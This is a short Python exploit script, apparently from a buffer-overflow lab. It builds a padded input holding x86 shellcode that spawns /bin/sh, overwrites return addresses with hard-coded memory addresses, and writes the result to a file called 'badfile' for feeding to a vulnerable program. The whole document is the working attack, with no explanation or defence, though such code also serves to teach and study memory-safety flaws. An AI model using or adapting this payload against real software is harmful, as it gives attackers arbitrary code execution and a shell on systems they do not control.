import struct 

shellcode=(b"\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80")
string_addr = struct.pack("I", 0x0804a060)
vuln_addr = struct.pack("I", 0x804849b)
offset_getinput = 160

p0 = 'a\n'

p = 'a' * 11
p += 'b'
p += 'c'
p += shellcode
p += 'd' * (148-len(p))
p += string_addr
p += 'd' * (160 - len(p))
p += vuln_addr

address_esad = int("0x0804a060", 16)
shellcode_addr = address_esad + 13

p += struct.pack("I", shellcode_addr)

payload = (p0 + p)

with open("badfile", "wb" ) as f:
	f.write(payload)
